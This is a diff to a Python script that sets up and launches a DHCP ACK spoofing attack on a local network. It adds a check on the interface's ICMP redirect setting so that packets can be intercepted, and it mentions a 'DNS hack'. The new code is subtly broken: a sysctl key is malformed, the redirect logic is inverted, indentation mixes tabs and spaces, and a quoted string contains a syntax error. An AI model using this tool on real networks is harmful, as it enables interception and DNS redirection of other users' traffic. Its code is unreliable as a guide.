@@ -25,7 +25,17 @@ if int(out.split(' ')[2]) != 1:
 
 interface = raw_input('Network interface to listen/spoof :').strip()
 
-print(interface)
+p = Popen(['sysctl', 'net.ipv4.conf.' + interface + 'send_redirects'], stdout=PIPE, stderr=PIPE)
+(out,err) = p.communicate()
+if int(out.split(' ')[2]) != 1:
+    print('By default, this interface will send ICMP redirect to the real gateway.')
+	print('That means you won't be able to intercept packets!')
+	print('If you are only targetting the DNS hack, however, this should not cause problem.')
+
+    activate_forwarding = raw_input('Deactivate ICMP redirect? (y/n) :')
+    if activate_forwarding == 'y':
+        p1 = Popen(['sysctl', 'net.ipv4.conf.'+interface+'send_redirects=1'], stdout=PIPE, stderr=PIPE)
+        p1.communicate()
 
 attack = DHCPAckSpoofing(interface=interface)
 
@@ -48,6 +58,6 @@ domain = DomainConfig(
     )
 
 print('\nLaunching the attack!!')
-print('waiting...')
+print('Waiting for clients to send DHCP request...')
 
 attack.launch_attack(domain_config=domain)
